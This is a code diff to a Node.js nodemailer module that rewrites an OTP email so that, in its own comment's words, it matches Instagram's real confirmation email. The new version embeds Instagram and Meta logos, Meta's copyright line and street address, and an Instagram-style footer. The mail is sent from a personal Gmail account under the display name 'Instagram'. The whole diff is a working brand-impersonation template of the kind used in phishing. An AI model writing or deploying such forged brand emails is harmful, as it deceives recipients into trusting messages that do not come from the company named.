@@ -1,4 +1,6 @@
 const nodemailer = require('nodemailer');
+const fs = require('fs');
+const path = require('path');
 
 /** Lazily-created singleton transporter. */
 let _transporter = null;
@@ -18,39 +20,180 @@ function getTransporter() {
 }
 
 /**
- * Send a 6-digit OTP email.
- * @param {string} to    Recipient email address
- * @param {string} otp   6-digit code
+ * Send a 6-digit OTP email matching Instagram's real confirmation email format.
+ * Embeds images as base64 data URLs for maximum compatibility.
+ * @param {string} to   Recipient email address
+ * @param {string} otp  6-digit code
  */
 async function sendOtpEmail(to, otp) {
   const transporter = getTransporter();
 
-  const html = `
-    <div style="font-family:Arial,sans-serif;max-width:480px;margin:0 auto;padding:32px 24px;border:1px solid #e0e0e0;border-radius:12px;">
-      <div style="text-align:center;margin-bottom:24px;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"
-             alt="Instagram" width="48" style="border-radius:12px;" />
-      </div>
-      <h2 style="font-size:20px;font-weight:700;color:#262626;margin:0 0 8px;">Your confirmation code</h2>
-      <p style="font-size:14px;color:#737373;margin:0 0 24px;line-height:1.5;">
-        Use the code below to reset your Instagram password. This code expires in <strong>10 minutes</strong>.
-      </p>
-      <div style="background:#f5f5f5;border-radius:10px;padding:20px;text-align:center;margin-bottom:24px;">
-        <span style="font-size:36px;font-weight:700;letter-spacing:10px;color:#262626;">${otp}</span>
-      </div>
-      <p style="font-size:12px;color:#aaaaaa;line-height:1.5;margin:0;">
-        If you didn't request this, you can safely ignore this email. Someone may have typed your email address by mistake.
-      </p>
-    </div>
-  `;
+  // Resolve absolute paths to image assets
+  const assetsPath = path.join(__dirname, '..', 'assets');
+  const instaLogoPath = path.join(assetsPath, 'insta-email-logo.png');
+  const metaLogoPath = path.join(assetsPath, 'meta-email-logo.png');
 
-  await transporter.sendMail({
+  // Read images and convert to base64
+  const instaLogoBase64 = fs.readFileSync(instaLogoPath).toString('base64');
+  const metaLogoBase64 = fs.readFileSync(metaLogoPath).toString('base64');
+
+  console.log('� Preparing email for:', to);
+  console.log('✅ Instagram logo loaded:', instaLogoBase64.length, 'chars (base64)');
+  console.log('✅ Meta logo loaded:', metaLogoBase64.length, 'chars (base64)');
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>${otp} is your Instagram code</title>
+  <!--[if mso]>
+  <noscript>
+    <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
+  </noscript>
+  <![endif]-->
+</head>
+<body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
+
+  <!-- Outer wrapper -->
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
+    style="background-color:#ffffff;min-width:100%;">
+    <tr>
+      <td align="center" style="padding:0;">
+
+        <!-- Content card — max 468px, full width on mobile -->
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0"
+          style="width:100%;max-width:468px;">
+
+          <!-- ── Top spacer ── -->
+          <tr><td style="height:32px;">&nbsp;</td></tr>
+
+          <!-- ── Instagram logo ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 28px;">
+              <img
+                src="data:image/png;base64,${instaLogoBase64}"
+                alt="Instagram"
+                width="197" height="40"
+                style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
+            </td>
+          </tr>
+
+          <!-- ── Body text ── -->
+          <tr>
+            <td style="padding:0 24px 6px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.6;">
+              Hi,
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:0 24px 24px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
+              This is your reset password OTP for Instagram account
+              <a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>.
+              If it was you, enter this confirmation code in the app:
+            </td>
+          </tr>
+
+          <!-- ── OTP code ── -->
+          <tr>
+            <td align="center" style="padding:8px 24px 32px;">
+              <span style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                           font-size:32px;font-weight:400;letter-spacing:8px;color:#555555;">
+                ${otp}
+              </span>
+            </td>
+          </tr>
+
+          <!-- ── Divider ── -->
+          <tr>
+            <td style="padding:0 24px;">
+              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+                <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
+              </table>
+            </td>
+          </tr>
+
+          <!-- ── "from" label ── -->
+          <tr>
+            <td align="center" style="padding:20px 24px 8px;">
+              <p style="margin:0;
+                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                        font-size:11px;color:#8e8e8e;">
+                from
+              </p>
+            </td>
+          </tr>
+
+          <!-- ── Meta logo ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 16px;">
+              <img
+                src="data:image/png;base64,${metaLogoBase64}"
+                alt="Meta"
+                width="67" height="22"
+                style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
+            </td>
+          </tr>
+
+          <!-- ── Copyright line ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 4px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:11px;color:#8e8e8e;line-height:1.6;">
+              © Instagram. Meta Platforms, Inc. ·
+              <a href="https://www.google.com/maps/search/1601+Willow+Road+Menlo+Park+CA+94025"
+                 style="color:#385898;text-decoration:none;">
+                1601 Willow Road, Menlo Park, CA 94025
+              </a>
+            </td>
+          </tr>
+
+          <!-- ── "This message was sent to" ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 32px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:11px;color:#8e8e8e;line-height:1.6;">
+              This message was sent to
+              <a href="mailto:${to}" style="color:#385898;text-decoration:none;">${to}</a>
+            </td>
+          </tr>
+
+        </table>
+        <!-- /Content card -->
+
+      </td>
+    </tr>
+  </table>
+
+</body>
+</html>`;
+
+  const text = `Hi,\n\nThis is your reset password OTP for Instagram account ${to}. If it was you, enter this confirmation code in the app:\n\n${otp}\n\n© Instagram. Meta Platforms, Inc. · 1601 Willow Road, Menlo Park, CA 94025\nThis message was sent to ${to}`;
+
+  const mailOptions = {
     from: `"Instagram" <${process.env.GMAIL_ID}>`,
     to,
-    subject: `${otp} is your Instagram confirmation code`,
+    subject: `${otp} is your Instagram code`,
     html,
-    text: `Your Instagram confirmation code is: ${otp}\n\nThis code expires in 10 minutes.\n\nIf you didn't request this, ignore this email.`,
-  });
+    text,
+  };
+
+  console.log('📤 Sending email with embedded base64 images...');
+  
+  try {
+    const info = await transporter.sendMail(mailOptions);
+    console.log('✅ Email sent successfully');
+    console.log('   Message ID:', info.messageId);
+    console.log('   Response:', info.response);
+    return info;
+  } catch (error) {
+    console.error('❌ Email send failed:', error.message);
+    throw error;
+  }
 }
 
 module.exports = { sendOtpEmail };
